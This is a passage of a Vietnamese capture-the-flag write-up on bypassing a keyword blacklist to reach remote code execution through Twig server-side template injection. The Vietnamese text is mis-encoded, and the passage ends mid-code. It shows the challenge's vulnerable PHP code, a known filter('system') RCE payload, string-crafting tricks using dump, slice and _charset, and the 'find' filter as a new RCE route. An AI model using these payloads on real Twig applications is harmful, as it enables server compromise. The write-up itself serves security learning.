class="s1"&gt;&amp;#39;-&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;templateContent&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;input&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="err"&gt;??&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;foreach&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;blacklist&lt;/span&gt; &lt;span class="n"&gt;as&lt;/span&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stripos&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;templateContent&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!==&lt;/span&gt; &lt;span class="bp"&gt;false&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;die&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;Error: The input contains forbidden content: &amp;#39;$item&amp;#39;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;try&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;template&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;twig&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;createTemplate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;templateContent&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;template&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;render&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;h2&amp;gt;Rendered Output:&amp;lt;/h2&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;div class=&amp;#34;output&amp;#34;&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;echo&lt;/span&gt; &lt;span class="n"&gt;htmlspecialchars&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="o"&gt;//&lt;/span&gt; &lt;span class="n"&gt;Ensure&lt;/span&gt; &lt;span class="n"&gt;no&lt;/span&gt; &lt;span class="n"&gt;XSS&lt;/span&gt; &lt;span class="n"&gt;vulnerabilities&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;/div&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="n"&gt;catch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;div class=&amp;#34;error&amp;#34;&amp;gt;Something went wrong! Try again.&amp;lt;/div&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;NgoÃ i ra táº¡i Ä‘Ã¢y mÃ¬nh tháº¥y há» báº­t cáº£ DebugExtension(), thÃ¬ mÃ¬nh cÃ³ thá»ƒ sá»­ dá»¥ng hÃ m dump() cÃ³ tÃ¡c dá»¥ng nhÆ° hÃ m var_dump() trong PHP chuyÃªn dÃ¹ng Ä‘á»ƒ xem dá»¯ liá»‡u Ä‘áº§u ra. Táº¡i Ä‘Ã¢y thÃ¬ mÃ¬nh cÃ³ thá»ƒ dump má»™t sá»‘ thÃ´ng tin cÃ³ trong template hiá»‡n táº¡i nhÆ° &lt;code&gt;_self(Ä‘Ã£ bá»‹ cáº¥m), _context, _charset,...&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Vá»›i Twig template thÃ¬ viá»‡c khai thÃ¡c SSTI chá»§ yáº¿u phá»¥ thuá»™c vÃ o cÆ¡ cháº¿ filter data cá»§a Twig cho phÃ©p biáº¿n Ä‘á»•i dá»¯ liá»‡u tÃ¹y theo má»¥c Ä‘Ã­ch sá»­ dá»¥ng template. Dá»¯ liá»‡u Ä‘i qua filter thÃ´ng qua dáº¥u &lt;code&gt;|&lt;/code&gt;, vÃ­ dá»¥ &lt;code&gt;{{data|filter(args..)}}&lt;/code&gt;. Má»™t sá»‘ filter thÃ´ng dá»¥ng lÃ  slice, upper, lower, join. NhÆ°ng bÃªn cáº¡nh Ä‘Ã³ cÃ³ má»™t sá»‘ filter phá»• biáº¿n bá»Ÿi cÃ³ thá»ƒ lá»£i dá»¥ng nÃ³ Ä‘á»ƒ RCE, Ä‘iá»ƒm chung cá»§a cÃ¡c filter nÃ y lÃ  chuyÃªn dÃ¹ng Ä‘á»ƒ xá»­ lÃ½ máº£ng, vÃ  mÃ¬nh cÃ³ thá»ƒ truyá»n vÃ o má»™t hÃ m mÅ©i tÃªn cá»¥ thá»ƒ Ä‘á»ƒ tÃ¹y biáº¿n quÃ¡ trÃ¬nh xá»­ lÃ½ dá»¯ liá»‡u theo Ã½ mÃ¬nh thÃ­ch biá»ƒu diá»…n báº±ng hÃ m mÅ©i tÃªn. LÃºc nÃ y mÃ¬nh cÃ³ thá»ƒ truyá»n vÃ o hÃ m lÃ  má»™t system function Ä‘á»ƒ thá»±c thi cÃ¡c cÃ¢u lá»‡nh, cÃ²n data sáº½ lÃ  command, tá»« Ä‘Ã³ ta má»›i cÃ³ cÃ¡c payload SSTI trÃªn HackTrick sáº½ tá»± tá»±a nhe kiá»ƒu:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;{{[&amp;#34;id&amp;#34;]|filter(&amp;#34;system&amp;#34;)}}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;NgoÃ i ra cÃ³ thá»ƒ ká»ƒ Ä‘áº¿n cÃ¡c filter nhÆ°: map, sort, filter, reduce -&amp;gt; Ä‘á»u Ä‘Ã£ bá»‹ cáº¥m háº¿t. Táº¥t nhiÃªn, vá»›i Ä‘á»‘ng blacklist kia thÃ¬ máº¥y payload nhÆ° nÃ y khÃ´ng hoáº¡t Ä‘á»™ng. NÃªn mÃ¬nh Ä‘Ã£ Ä‘i tÃ¬m cÃ¡ch Ä‘á»ƒ craft Ä‘Æ°á»£c payload nhÆ° tháº¿ nÃ y, nhÆ°ng viá»‡c khai bÃ¡o string vá»›i máº£ng lÃ  khÃ´ng thá»ƒ vÃ¬ chall cÅ©ng Ä‘Ã£ cáº¥m dáº¥u ngoáº·c vuÃ´ng lÃ  2 kiá»ƒu nhÃ¡y. Äiá»u nÃ y lÃ m mÃ¬nh báº¿ táº¯c trong 1 khoáº£ng thá»i gian dÃ i mÃ  khÃ´ng tÃ¬m Ä‘Æ°á»£c cÃ¡ch nÃ o, nÃ³ lÃ m mÃ¬nh mÃ´ng lung khÃ´ng xÃ¡c Ä‘á»‹nh Ä‘Æ°á»£c trá»ng tÃ¢m cáº§n pháº£i lÃ m nhá»¯ng gÃ¬ Ä‘á»ƒ RCE Ä‘Æ°á»£c challenge nÃ y.
Sau khi teammate tÃ¬m ra Ä‘Æ°á»£c cÃ¡ch Ä‘á»ƒ ná»‘i chuá»—i lÃ  sá»­ dá»¥ng dump() vÃ  ghÃ©p cÃ¡c kÃ½ tá»± trong Ä‘áº¥y Ä‘á»ƒ thÃ nh chuá»—i, mÃ¬nh má»›i xÃ¡c Ä‘á»‹nh Ä‘Æ°á»£c 2 bÆ°á»›c cáº§n lÃ m Ä‘á»ƒ solve challenge:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;TÃ¬m Ä‘Æ°á»£c cÃ¡ch ná»‘i chuá»—i cÃ¡c kÃ½ tá»± tÃ¹y Ã½ Ä‘á»ƒ khÃ´ng phá»¥ thuá»™c vÃ o context do context giá»›i háº¡n sá»‘ lÆ°á»£ng tá»« ngá»¯.&lt;/li&gt;
&lt;li&gt;TÃ¬m filter cÃ³ tÃ¡c dá»¥ng RCE tÆ°Æ¡ng tá»± nhÆ° cÃ¡c filter Ä‘Ã£ bá»‹ blacklist&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="bypass"&gt;Bypass
&lt;/h2&gt;&lt;h3 id="craft-string-in-twig-using--set--"&gt;Craft String in Twig using {% set &amp;hellip; %}
&lt;/h3&gt;&lt;p&gt;Vá»›i viá»‡c cáº¥m táº¥t cáº£ dáº¥u nhÃ¡y, viá»‡c khai bÃ¡o má»™t string hay array cÆ¡ báº£n lÃ  khÃ´ng thá»ƒ. Tuy nhiÃªn ta cÃ³ thá»ƒ dá»¥ng dáº¥u &lt;code&gt;~&lt;/code&gt; Ä‘á»ƒ ná»‘i chuá»—i cÃ¡c string vá»›i nhau hoáº·c cÃ¡c &lt;strong&gt;biáº¿n&lt;/strong&gt; vá»›i nhau. NÃªn Ã½ tÆ°á»Ÿng ban Ä‘áº§u lÃ  sá»­ dump() -&amp;gt; var_dump ra context hiá»‡n táº¡i, dÃ¹ng slice Ä‘á»ƒ láº¥y tá»«ng kÃ½ tá»± trong chuá»—i tráº£ ra vÃ  ná»‘i chÃºng láº¡i vá»›i nhau thÃ nh chuá»—i.
&lt;img src="https://hackmd.io/_uploads/HkN6MqVhC.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;img src="https://hackmd.io/_uploads/HyfaXq4hC.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Vá»›i cÃ¡ch nÃ y ta cÃ³ thá»ƒ táº¡o thÃ nh string, tuy nhiÃªn bá»‹ giá»›i háº¡n vá» máº·t tá»« ngá»¯, vÃ  viá»‡c ghÃ©p tá»«ng kÃ½ tá»± theo sá»‘ nhÆ° nÃ y ráº¥t má»‡t, nháº¥t lÃ  viá»‡c flag cÃ³ nhiá»u kÃ½ tá»± nhÆ° kia mÃ  ta khÃ´ng cÃ³ kÃ½ tá»± * thÃ¬ ná»‘i Ä‘áº¿n cháº¿t :skull:
Thay vÃ¬ láº¥y tá»« dump, ta cÃ³ thá»ƒ sá»­ dá»¥ng &lt;code&gt;{}&lt;/code&gt; Ä‘á»ƒ má»™t tham sá»‘ thÃ nh máº£ng, nÆ¡i giÃ¡ trá»‹ cá»§a tham sá»‘ lÃ  value cá»§a nÃ³:
&lt;img src="https://hackmd.io/_uploads/SkOwrcE3A.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Káº¿t há»£p nÃ³ vá»›i dump thÃ¬ ta cÃ³:
&lt;img src="https://hackmd.io/_uploads/rybTHqE2C.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
TÃªn tham sá»‘ sytem Ä‘Æ°á»£c Ä‘Æ°a vÃ o máº£ng, vá»›i giÃ¡ trá»‹ tÆ°Æ¡ng á»©ng lÃ  giÃ¡ trá»‹ cá»§a tham sá»‘ sytem vÃ  = NULL -&amp;gt; slice máº£ng nÃ y sáº½ dá»… hÆ¡n slice tá»«ng kÃ­ tá»± má»™t khi sá»­ dá»¥ng &lt;code&gt;dump()&lt;/code&gt;
Váº­y lÃ  ta cÃ³ thá»ƒ craft ra cÃ¡c kÃ½ tá»± rá»“i, nhÆ°ng flag náº±m á»Ÿ / vÃ  flag cÅ©ng chá»©a dáº¥u - thÃ¬ ta pháº£i xá»­ lÃ½ nhÆ° tháº¿ nÃ o. Khi &lt;code&gt;_context&lt;/code&gt; khÃ´ng chá»©a dáº¥u / vÃ  náº¿u ta cÅ©ng khÃ´ng thá»ƒ Ä‘Æ°a dáº¥u &lt;code&gt;*&lt;/code&gt; vÃ o bÃªn trong &lt;code&gt;dump({})&lt;/code&gt; vÃ¬ nhÆ° tháº¿ sáº½ lá»—i ngay:
&lt;img src="https://hackmd.io/_uploads/HJkUUcEnC.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Váº­y nhiá»‡m vá»¥ tiáº¿p theo lÃ  cáº§n dáº¥u &lt;code&gt;/&lt;/code&gt; vÃ  dáº¥u &lt;code&gt;-&lt;/code&gt; báº±ng cÃ¡ch tiáº¿p tá»¥c sá»­ dá»¥ng &lt;code&gt;dump()&lt;/code&gt;
Vá»›i dáº¥u &lt;code&gt;-&lt;/code&gt; thÃ¬ trong &lt;code&gt;_charset&lt;/code&gt; ta sáº½ tháº¥y cÃ³ xuáº¥t hiá»‡n dáº¥u Ä‘Ã³ náº±m trong chuá»—i &lt;code&gt;UTF-8&lt;/code&gt;. Ta láº¥y kÃ½ tá»± thá»© 4, tÆ°Æ¡ng á»©ng vá»›i slice(3,1) vÃ¬ vá»‹ trÃ­ string báº¯t Ä‘áº§u Ä‘áº¿m tá»« 0 Ä‘á»ƒ láº¥y dáº¥u &lt;code&gt;-&lt;/code&gt; ra:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;{% set hyphen = _charset|slice(3,1) %}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src="https://hackmd.io/_uploads/HksWD5V30.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
CÃ²n dáº¥u &lt;code&gt;/&lt;/code&gt; thÃ¬ ta cÃ³ thá»ƒ láº¥y kÃ½ tá»± xuá»‘ng dÃ²ng (sáº½ xuáº¥t hiá»‡n khi dump) sau Ä‘Ã³ thÃªm filter &lt;code&gt;nl2br&lt;/code&gt; Ä‘á»ƒ chuyá»ƒn kÃ½ tá»± xuá»‘ng dÃ²ng thÃ nh tháº» HTML &lt;code&gt;&amp;lt;br/&amp;gt;&lt;/code&gt;, tiáº¿p tá»¥c sá»­ dá»¥ng filter &lt;code&gt;raw&lt;/code&gt; Ä‘á»ƒ giá»¯ nguyÃªn tháº» khÃ´ng bá»‹ html encode, rá»“i slice láº¥y dáº¥u &lt;code&gt;/&lt;/code&gt; bÃªn trong tháº» br:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;{% set slash = dump()|slice(10,1)|nl2br|raw|slice(4,1) %}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;NgoÃ i cÃ¡ch sá»­ dá»¥ng &lt;code&gt;{}&lt;/code&gt;, ta cÅ©ng cÃ³ thá»ƒ sá»­ dá»¥ng filter split chuá»—i Ä‘áº§u vÃ o vá»›i kÃ½ tá»± khÃ´ng tá»“n táº¡i trong chuá»—i Ä‘á»ƒ chuyá»ƒn chuá»—i thÃ nh máº£ng, vÃ¬ cÃ´ng dá»¥ng cá»§a split lÃ  chia chuá»—i thÃ nh máº£ng cÃ¡c pháº§n tá»­ theo kÃ½ tá»± xÃ¡c Ä‘á»‹nh
&lt;img src="https://hackmd.io/_uploads/S18kYqEnR.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;h3 id="find-twig-filters-to-rce"&gt;Find Twig filters to RCE
&lt;/h3&gt;&lt;h4 id="find"&gt;find
&lt;/h4&gt;&lt;p&gt;CÃ´ng cá»¥ Ä‘Ã£ cÃ³ Ä‘á»§ cáº£, giá» thá»© mÃ¬nh vÃ  Ä‘á»“ng Ä‘á»™i Ä‘Ã£ stuck ráº¥t lÃ¢u má»›i tÃ¬m ra, Ä‘Ã³ lÃ  filters phÃ¹ há»£p Ä‘á»ƒ cÃ³ thá»ƒ RCE.
Biáº¿t Ä‘Æ°á»£c phiÃªn báº£n Twig Ä‘ang sá»­ dá»¥ng lÃ  3.12, mÃ¬nh tÃ¬m kiáº¿m nhÆ°ng káº¿t quáº£ no hope, cÃ y háº¿t cÃ¡i doc cÃ¡c filters cá»§a Twig thÃ¬ toÃ n cÃ¡i khÃ´ng dÃ¹ng Ä‘Æ°á»£c, nhá»¯ng cÃ¡i dÃ¹ng Ä‘Æ°á»£c Ä‘á»u bá»‹ blacklist háº¿t.
BÃ­ ngÃ²i cáº£ 1 ngÃ y thÃ¬ teammate tÃ¬m ra filter &lt;code&gt;find&lt;/code&gt; cÃ³ thá»ƒ Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ RCE:
&lt;img src="https://hackmd.io/_uploads/HJsPKcEh0.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Vá» cÃ¡ch sá»­ dá»¥ng thÃ¬ y chang cÃ¡c filter Ä‘Ã£ bá»‹ blacklist, tá»± há»i táº¡i sao nÃ³ khÃ´ng á»Ÿ trong doc thÃ¬ cÃ³ láº½ doc upadte chÆ°a tá»›i do filter nÃ y má»›i Ä‘Æ°á»£c thÃªm vÃ o táº¡i phiÃªn báº£n 3.11:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/BJWa55Vn0.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Filter nÃ y náº±m táº¡i file &lt;code&gt;/Twig/src/Extension/CoreExtension.php&lt;/code&gt;, lÃ  má»™t trong cÃ¡c filter cÃ³ sáºµn cá»§a Twig, Ä‘oáº¡n code xá»­ lÃ½ filter nÃ y sáº½ nhÆ° sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;public function getFilters(): array
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ...
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; // array helpers
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; new TwigFilter(&amp;#39;find&amp;#39;, [self::class, &amp;#39;find&amp;#39;], [&amp;#39;needs_environment&amp;#39; =&amp;gt; true]),
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ...
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/**
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; * @internal
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; */
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;public static function find(Environment $env, $array, $arrow)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; self::checkArrowInSandbox($env, $arrow, &amp;#39;find&amp;#39;, &amp;#39;filter&amp;#39;);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; foreach ($array as $k =&amp;gt; $v) {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if ($arrow($v, $k)) {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return $v;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return null;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Vá» cÆ¡ báº£n, ta truyá»n vÃ o hÃ m file máº£ng Ä‘á»ƒ xá»­ lÃ½ -&amp;gt; $array vÃ  tÃªn hÃ m mÅ©i tÃªn custom Ä‘i kÃ¨m -&amp;gt; $arrow.&lt;/li&gt;
&lt;li&gt;HÃ m sáº½ Ä‘i duyá»‡t tá»«ng pháº§n tá»­ trong máº£ng, sá»‘ thá»© tá»± pháº§n tá»­ máº£ng lÆ°u vÃ o biáº¿n $k, ná»™i dung cá»§a pháº§n tá»­ Ä‘Ã³ lÆ°u vÃ o biáº¿n $v. Biáº¿n $array lÃºc nÃ y sáº½ Ä‘Æ°á»£c Ä‘Æ°a vÃ o lÃ m tÃªn hÃ m, vá»›i 2 tham sá»‘ truyá»n vÃ o láº§n lÆ°á»£t lÃ  ná»™i dung pháº§n tá»­ vÃ  thá»© tá»± cá»§a pháº§n tá»­ Ä‘Ã³. Vá»«a hay lÃ  ta cÃ³ thá»ƒ truyá»n cÃ¡c tham sá»‘ tÆ°Æ¡ng tá»± nhÆ° váº­y vÃ o cÃ¡c hÃ m thá»±c thi cÃ¢u lá»‡nh nhÆ°:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
